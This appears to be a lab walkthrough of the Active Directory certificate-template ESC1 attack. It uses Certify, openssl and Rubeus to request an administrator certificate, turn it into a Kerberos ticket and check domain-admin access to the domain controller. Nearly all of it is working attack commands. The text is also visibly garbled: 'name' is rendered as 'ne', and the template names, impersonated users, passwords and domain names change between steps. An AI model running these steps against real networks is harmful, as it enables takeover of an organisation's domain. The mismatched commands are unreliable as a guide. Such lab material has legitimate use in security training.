#### 1. Find Enrollee Supplies Subject
```markdown
C:\AD\Tools>C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject

##### Review

- **Template ne**
- **Enrollment Rights**
- **msPKI-Certificates-ne-Flag**
- **pkiextendedkeyusage**

Template ne: ESC1
Enrollment Rights: ESSOS\Domain users
msPKI-Certificates-ne-Flag: ENROLLEE_SUPPLIES_SUBJECT

The ESC1 template grants enrollment rights to the domain users group and allows requesters to supply subject ne or SAN or SubjectAltne.
```

#### 2. Let's Request a Certificate for DA - Administrator
```markdown
Certify.exe request /ca:server\DC-CA /template:"HTTPSCertificates" /altne:administrator
```

#### 3. Save the Certificate for DA
```markdown
Copy all of the key text between -----BEGIN RSA PRIVATE KEY----- and END CERTIFICATE and save it to esc1.pem.
```

#### 4. Convert It to PFX
```markdown
Use openssl binary on the student VM to do that. I will use SecretPass@123 as the export password.

C:\AD\Tools>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

#### 5. Get TGT for Impersonated DA Using PFX Cert
```markdown
Rubeus.exe asktgt /user:domainadmin /certificate:esc1-DA.pfx /password:1qa2ws3ed /ptt
```

#### 6. Check if We Are Domain Admin Against the DC
```markdown
C:\AD\Tools>winrs -r:dcorp-dc whoami
```

